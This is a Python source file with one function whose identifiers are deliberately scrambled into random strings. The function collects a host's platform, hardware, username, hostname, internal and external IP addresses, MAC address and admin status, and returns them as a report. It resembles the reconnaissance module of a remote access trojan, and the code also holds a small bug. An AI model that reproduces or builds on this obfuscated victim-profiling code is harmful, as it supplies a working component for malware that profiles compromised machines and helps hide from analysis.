# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ(plat_type):
    NXBBtgKjydVvgkPulaCtdRpsYFeBosVc = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    RawpwcYlDhNTFdxUVddgJVJAkNPWKqyL = getpass.getuser()
    yoXUBYbACcSUxUoKHhHIaEoZZWtvhwEh    = socket.gethostname()
    GzOWqSpdyCgriSdHfLfdUUrMeAALPZkT        = socket.getfqdn()
    FSgXFYCBEmzKLCNnvCdyUJdLetkHsLnJ = socket.gethostbyname(yoXUBYbACcSUxUoKHhHIaEoZZWtvhwEh)
    wGxTGZJscuVIlgbsOngoHBJnFWEPMSZK     = uuid.getnode()
    tpYseHibKVNdRgAJUbpTdHqAOJftccdZ         = ':'.join(("%012X" % wGxTGZJscuVIlgbsOngoHBJnFWEPMSZK)[LzGXqmNenirBzPlhVchwrEvaQRzIMgwH:LzGXqmNenirBzPlhVchwrEvaQRzIMgwH+2] for LzGXqmNenirBzPlhVchwrEvaQRzIMgwH in range(0, 12, 2))
    OTBWyfvgvkFIxeoTgyNKlBeLVAaYQyEY = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    dwbzgmvKufaIguHCYDTxscalDoZMTgCl = ''
    for YVUdGVfPLuGahYVogiZwNjGiGgGkIegS in OTBWyfvgvkFIxeoTgyNKlBeLVAaYQyEY:
        try:
            dwbzgmvKufaIguHCYDTxscalDoZMTgCl = urllib.urlopen('http://'+YVUdGVfPLuGahYVogiZwNjGiGgGkIegS).read().rstrip()
        except IOError:
            pass
        if dwbzgmvKufaIguHCYDTxscalDoZMTgCl and (6 < len(dwbzgmvKufaIguHCYDTxscalDoZMTgCl) < 16):
            break
    fonjSqFpnvAjKGfsCqPwfcqaqEkNSRDo = False
    if plat_type.startswith('win'):
        fonjSqFpnvAjKGfsCqPwfcqaqEkNSRDo = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        fonjSqFpnvAjKGfsCqPwfcqaqEkNSRDo = os.getuid() == 0
    FzYuMgdEPvdjoisuSOXpgjgpCyiDdGmH = 'Yes' if fonjSqFpnvAjKGfsCqPwfcqaqEkNSRDo else 'No'
    sEVvIpyvehNmcBRhFVlxOTYasdqzTyBQ = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(NXBBtgKjydVvgkPulaCtdRpsYFeBosVc, processor, architecture,
    yoXUBYbACcSUxUoKHhHIaEoZZWtvhwEh, GzOWqSpdyCgriSdHfLfdUUrMeAALPZkT, FSgXFYCBEmzKLCNnvCdyUJdLetkHsLnJ, dwbzgmvKufaIguHCYDTxscalDoZMTgCl, tpYseHibKVNdRgAJUbpTdHqAOJftccdZ, RawpwcYlDhNTFdxUVddgJVJAkNPWKqyL, FzYuMgdEPvdjoisuSOXpgjgpCyiDdGmH)
    return sEVvIpyvehNmcBRhFVlxOTYasdqzTyBQ
